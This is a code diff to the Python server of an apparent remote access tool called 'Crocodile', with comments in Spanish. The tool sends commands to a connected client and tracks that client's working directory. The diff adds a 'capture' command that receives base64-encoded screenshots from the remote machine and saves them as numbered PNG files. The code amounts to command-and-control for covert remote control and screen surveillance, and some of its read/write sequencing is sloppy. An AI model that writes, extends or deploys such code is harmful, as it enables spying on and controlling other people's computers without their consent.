@@ -1,6 +1,8 @@
 import sys
 import os
 import asyncio
+import base64
+import struct
 project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
 sys.path.insert(0, project_root)
 from crypto.aes_encryptor import AESEncryptor
@@ -32,6 +34,47 @@ class Crocodile:
                     resp = await reader.read(1024)
                     current_dir = resp.decode()
                     print(current_dir)
+                elif command.startswith("capture"):
+                    writer.write(command.encode('utf-8'))
+                    try:
+                        # Leer header con longitud
+                        header = await reader.readexactly(4)
+                        data_len = struct.unpack("!I", header)[0]
+                        
+                        # Leer todos los datos codificados
+                        encoded_data = await reader.readexactly(data_len)
+                        decoded_data = base64.b64decode(encoded_data)
+                        
+                        if decoded_data == b"fail":
+                            print("Fallo en cliente")
+                        else:
+                            # Configurar directorio y nombre de archivo
+                            capture_dir = "./Capture"
+                            os.makedirs(capture_dir, exist_ok=True)  # Crea directorio si no existe
+                            
+                            # Generar ruta completa CORRECTAMENTE
+                            filename = f"monitor-{count}.png"
+                            filepath = os.path.join(capture_dir, filename)  # Combina rutas
+                            
+                            # Guardar archivo en "../Capture/monitor-X.png"
+                            with open(filepath, "wb") as f:
+                                f.write(decoded_data)
+                            
+                            count += 1
+                            print(f"Captura guardada en: {filepath}")
+                            
+                            # Enviar confirmación al cliente
+                            writer.write(b"CAPTURE_SUCCESS")
+                        
+                        # Enviar confirmación
+                        writer.write(b"OK")
+                        await writer.drain()
+                        writer.write(b"pwd")
+                        resp = await reader.read(1024)
+                        current_dir = resp.decode()
+                    except Exception as e:
+                        writer.write(b"FAIL")
+                        await writer.drain()
                 else:
                     res= command.encode('utf-8')
                     writer.write(res)
@@ -39,8 +82,7 @@ class Crocodile:
                     current_dir = resp
                     writer.write(b"pwd")
                     resp2 = await reader.read(1024)
-                    current_dir = resp2
-                    print(current_dir)
+                    current_dir = resp2.decode()
                 if not resp:
                     print("🔴 El cliente cerró la conexión.")
                     break
